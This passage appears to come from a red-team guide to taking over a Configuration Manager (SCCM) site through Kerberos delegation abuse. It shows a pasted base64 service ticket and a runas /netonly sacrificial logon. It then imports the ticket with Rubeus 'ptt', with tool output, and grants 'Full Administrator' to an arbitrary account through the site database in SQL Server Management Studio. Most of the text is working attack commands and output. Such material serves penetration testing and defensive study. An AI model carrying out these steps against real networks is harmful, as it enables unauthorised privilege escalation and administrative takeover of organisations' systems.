      doIFnDCCBZigAwIBBaEDAgEWooIEmjCCBJZhggSSMIIEjqADAgEFoQ8bDU1BWVlIRU0uTE9DQUyiMjAwoAMCAQGhKTAnGwhNU1NRTFN2YxsbU0lURTMtREIuTUFZWUhFTS5MT0NBTDoxNDMzo4IEQDCCBDygAwIBF6EDAgECooIELgSCBCrQ0fgxcYKC86CoZYKnW00ZNLJRl2Vfn9hFIkkTwXzcRF7hyESIYvUkJqjtmm0butbj1+IxrfL9je7iAXV4i2peWLEMEZcVnCzNo88e/Wg/BSLiGYH3VMkn5+r43TlY8RWBZ4MD9yFFxkO/Bw7j7NSzL8itXIHOeEgAM/W2lv4SneurG8oKrp/yld9aTs1aRWXIghXYq8DqPz1s26TcXL4hkgsYDXp1vMTHsbM7SihTXIHjZw67EFZe4fJ4tT4fj2XLc3VSLFAtegHz/Pn1yVEJkcFmhHQv2JTr7bsjRLFr9vlUOW56dwocBnS4Iie8KrNSJ9vOCMXzpMTbFv+V8VxECsXNWyT6APsRFyK4FUegK5I0eQQVBDdsqYpahIBtDSA4UcJMTQxNyXvrsIZRYgnYzE+bDhEFoOKiAtTQaIvGUsTAcJjnqs1uQObE2dAORa3jbR/DQb/NVs3v48AF67NMSAdnR7Ff9H72tuw0Mhz3CNpnDy5s5XXQNnXHlkWyA4xyV3+dv3qcxEwvwtEppzKt6zpSO9d0Aohpl71zhuaV/APf9uavdKQ12I+Pd2xmuSoMaKpedl5odRX6sj2enpThmXYRMlwGh5g+wnnLBp321Y5WvrPE4gNtH4nTgG6f8T8W2joVSe0vZLgzaPlDhWOVsB1urd+hrLoZAAqnlvMxJS5Ph1z2iTRTjGfG41UudK/xiomFnJoTmpbtzXy+gNlXjI7mlPDqDFQfco690M/lSpm9zxTlLJihLDfSicRFB8LaB1Is4On6To5YELcGIFzTPsIcIIYXK+jJKTSLLhOueHLpsNzUWoq93PxbeR9MgUGVH9220DXl9dRnT7Eux3GQmVGj4UL4pIOHfGTYqvv9Xr3rlaHbCbTwB4QKT4lmz6Kf5Wq1rtBeh91lbNV4EwbboUXujbXK1dm7w1DHApeBgXRxWeYNgns0jQ6ZTj3GTQL8XOLhpBHPZeqnekIKrGnVZx4GmpmINNIs+7d8ytqVovx9wXJp4/5kqUWAFshf3dAAMKlH8OGUHzcpfpNzLviL+m53mmx0PPCWlBqpgArfABkcxjdyd3qPzmZzKCGCyk8c258tGRsDC0YD1yRKPQfntnQ+F71W1c9I/8aknUpN7W0x896/CBuDGIe88B9neO8XJwbAQgqMRJAzIqn5YjoFfNlbMt8QN4pVx6POJPbKP95Mctn+6Bgcx9lvksBDGxR1VBimFMcxqQtvJe+BgFGZzQKtSuz4onuuj8DnC/Nk9JvhQQP5805dV7JJq2URLWrwjpUrUtH41vKqu0n1Iyh8GB7czRogdjzeCPnQ1XTOdO2Kml9garo2CqVw5sZfWk3W2veaMmapw5og4Nv745nG/Xx2WXeNHK3MmJctl6hHLC90vn0948LuDlHq2X+M3kDYyY5fmNBivVPso4HtMIHqoAMCAQCigeIEgd99gdwwgdmggdYwgdMwgdCgGzAZoAMCARehEgQQoAiJugdRRTbS5gjvJ92UA6EPGw1NQVlZSEVNLkxPQ0FMohkwF6ADAgEKoRAwDhsMU0lURS1TRVJWRVIkowcDBQBAoQAApREYDzIwMjQwMzA1MTA1MjQ4WqYRGA8yMDI0MDMwNTIwNTIyNlqnERgPMjAyNDAzMTIxMDUyMjZaqA8bDU1BWVlIRU0uTE9DQUypMjAwoAMCAQGhKTAnGwhNU1NRTFN2YxsbU0lURTMtREIuTUFZWUhFTS5MT0NBTDoxNDMz
```

10. Start a sacrificial logon session for the Kerberos ticket:
```
runas /netonly /user:asdf powershell
Enter the password for asdf:
Attempting to start powershell as user "CLIENT\asdf" ...
```

11. Import the ticket into the sacrificial logon session:

```
Rubeus.exe ptt /ticket:doIFnDCCBZigAwIBBaEDAgEWooIEmjCCBJZhggSSMIIEjqADAgEFoQ8bDU1BWVlIRU0uTE9DQUyiMjAwoAMCAQGhKTAnGwhNU1NRTFN2YxsbU0lURTMtREIuTUFZWUhFTS5MT0NBTDoxNDMzo4IEQDCCBDygAwIBF6EDAgECooIELgSCBCrQ0fgxcYKC86CoZYKnW00ZNLJRl2Vfn9hFIkkTwXzcRF7hyESIYvUkJqjtmm0butbj1+IxrfL9je7iAXV4i2peWLEMEZcVnCzNo88e/Wg/BSLiGYH3VMkn5+r43TlY8RWBZ4MD9yFFxkO/Bw7j7NSzL8itXIHOeEgAM/W2lv4SneurG8oKrp/yld9aTs1aRWXIghXYq8DqPz1s26TcXL4hkgsYDXp1vMTHsbM7SihTXIHjZw67EFZe4fJ4tT4fj2XLc3VSLFAtegHz/Pn1yVEJkcFmhHQv2JTr7bsjRLFr9vlUOW56dwocBnS4Iie8KrNSJ9vOCMXzpMTbFv+V8VxECsXNWyT6APsRFyK4FUegK5I0eQQVBDdsqYpahIBtDSA4UcJMTQxNyXvrsIZRYgnYzE+bDhEFoOKiAtTQaIvGUsTAcJjnqs1uQObE2dAORa3jbR/DQb/NVs3v48AF67NMSAdnR7Ff9H72tuw0Mhz3CNpnDy5s5XXQNnXHlkWyA4xyV3+dv3qcxEwvwtEppzKt6zpSO9d0Aohpl71zhuaV/APf9uavdKQ12I+Pd2xmuSoMaKpedl5odRX6sj2enpThmXYRMlwGh5g+wnnLBp321Y5WvrPE4gNtH4nTgG6f8T8W2joVSe0vZLgzaPlDhWOVsB1urd+hrLoZAAqnlvMxJS5Ph1z2iTRTjGfG41UudK/xiomFnJoTmpbtzXy+gNlXjI7mlPDqDFQfco690M/lSpm9zxTlLJihLDfSicRFB8LaB1Is4On6To5YELcGIFzTPsIcIIYXK+jJKTSLLhOueHLpsNzUWoq93PxbeR9MgUGVH9220DXl9dRnT7Eux3GQmVGj4UL4pIOHfGTYqvv9Xr3rlaHbCbTwB4QKT4lmz6Kf5Wq1rtBeh91lbNV4EwbboUXujbXK1dm7w1DHApeBgXRxWeYNgns0jQ6ZTj3GTQL8XOLhpBHPZeqnekIKrGnVZx4GmpmINNIs+7d8ytqVovx9wXJp4/5kqUWAFshf3dAAMKlH8OGUHzcpfpNzLviL+m53mmx0PPCWlBqpgArfABkcxjdyd3qPzmZzKCGCyk8c258tGRsDC0YD1yRKPQfntnQ+F71W1c9I/8aknUpN7W0x896/CBuDGIe88B9neO8XJwbAQgqMRJAzIqn5YjoFfNlbMt8QN4pVx6POJPbKP95Mctn+6Bgcx9lvksBDGxR1VBimFMcxqQtvJe+BgFGZzQKtSuz4onuuj8DnC/Nk9JvhQQP5805dV7JJq2URLWrwjpUrUtH41vKqu0n1Iyh8GB7czRogdjzeCPnQ1XTOdO2Kml9garo2CqVw5sZfWk3W2veaMmapw5og4Nv745nG/Xx2WXeNHK3MmJctl6hHLC90vn0948LuDlHq2X+M3kDYyY5fmNBivVPso4HtMIHqoAMCAQCigeIEgd99gdwwgdmggdYwgdMwgdCgGzAZoAMCARehEgQQoAiJugdRRTbS5gjvJ92UA6EPGw1NQVlZSEVNLkxPQ0FMohkwF6ADAgEKoRAwDhsMU0lURS1TRVJWRVIkowcDBQBAoQAApREYDzIwMjQwMzA1MTA1MjQ4WqYRGA8yMDI0MDMwNTIwNTIyNlqnERgPMjAyNDAzMTIxMDUyMjZaqA8bDU1BWVlIRU0uTE9DQUypMjAwoAMCAQGhKTAnGwhNU1NRTFN2YxsbU0lURTMtREIuTUFZWUhFTS5MT0NBTDoxNDMz

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

12. Launch SQL Server Management Studio, connect to the site database, and grant the "Full Administrator" role to an arbitrary account (see TAKEOVER-1):

```
C:\Program Files (x86)\Microsoft SQL Server Management Studio 19\Common7\IDE\Ssms.exe
```

Note that it may be possible to conduct this attack entirely from the site database server if the attacker can force the use of Kerberos authentication locally (e.g., using tradecraft similar to KrbRelayUp).

### Linux



## References
Elad Shamir, Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory, https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
Charlie Clark, Revisiting 'Delegate 2 Thyself', https://exploit.ph/revisiting-delegate-2-thyself.html
Charlie Bromberg, S4U2self Abuse, https://www.thehacker.recipes/a-d/movement/kerberos/delegations/s4u2self-abuse